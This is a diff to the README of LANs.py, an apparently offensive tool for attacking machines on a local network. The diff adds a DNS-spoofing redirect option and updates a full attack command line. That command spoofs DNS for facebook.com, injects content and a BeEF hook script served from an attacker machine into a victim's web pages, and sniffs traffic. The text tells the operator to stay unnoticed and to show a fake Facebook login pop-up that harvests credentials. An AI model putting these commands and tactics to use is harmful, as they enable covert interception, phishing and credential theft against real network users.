@@ -11,12 +11,12 @@ Prereqs: Linux, scapy, python nfqueue-bindings 0.4.3+, aircrack-ng, python twist
 Tested on Kali 1.0. In the following examples 192.168.0.5 will be the attacking machine and 192.168.0.10 will be the victim.
 
 
-Full usage:
+All options:
 
 ``` shell
-LANs.py [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC] [-d]
-  [-v] [-dns DNSSPOOF] [-set] [-p] [-na] [-n] [-i INTERFACE] [-rip ROUTERIP]
-  [-rmac ROUTERMAC] [-pcap PCAP]
+python LANs.py [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC] [-d]
+  [-v] [-dns DNSSPOOF] [-r IPADDRESS] [-set] [-p] [-na] [-n] [-i INTERFACE] 
+  [-rip ROUTERIP] [-rmac ROUTERMAC] [-pcap PCAP]
 ```
 
 Usage
@@ -72,10 +72,10 @@ python LANs.py -pcap libpcapfilename -ip 192.168.0.10
 To read from a pcap file you must include the target's IP address with the -ip option. It must also be in libpcap form which is the most common anyway. One advantage of reading from a pcap file is that you do not need to be root to execute the script.
 
 
-### Aggressive usage:
+### Most aggressive usage:
 
 ``` shell
-python LANs.py -v -d -p -n -na -set -dns facebook.com -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
+python LANs.py -v -d -p -n -na -set -dns facebook.com -r 74.125.225.64 -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
 ```
 
 ### All options:
@@ -91,6 +91,8 @@ python LANs.py -h
 -d: open an xterm with driftnet to see all images they view
 
 -dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com
+
+-r IPADDRESS: only to be used with the -dns DOMAIN option; redirect the user to this IPADDRESS when they visit DOMAIN
 
 -u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
 
@@ -133,10 +135,13 @@ This script uses a python nfqueue-bindings queue wrapped in a Twisted IReadDescr
 
 Injecting code undetected is a dicey game, if a minor thing goes wrong or the server the victim is requesting data from performs things in unique or rare way then the user won't be able to open the page they're trying to view and they'll know something's up. This script is designed to forward packets if anything fails so during usage you may see lots of "[!] Injected packet for www.domain.com" but only see one or two domains on the BEeF panel that the browser is hooked on. This is OK. If they don't get hooked on the first page just wait for them to browse a few other pages. The goal is to be unnoticeable. My favorite BEeF tools are in Commands > Social Engineering. Do things like create an official looking Facebook pop up saying the user's authentication expired and to re-enter their credentials.
 
-NOTE TO UBUNTU USERS:
-You will need to update your nfqueue-bindings to the latest version (0.4.3 as time of writing) or you will have to edit the Parser.start() (line 127) function to say:
+NOTE TO UBUNTU USERS: you will need to update/manually install nfqueue-bindings to version 0.4.3 due to the fact the version in Ubuntu's repo is 0.2. Alternatively just edit the Parser.start() function on line 135 from:
 
-def start(self, i, payload):
+def start(self, payload):
+
+to:
+
+def start(self, i, payload)
 
 
 License
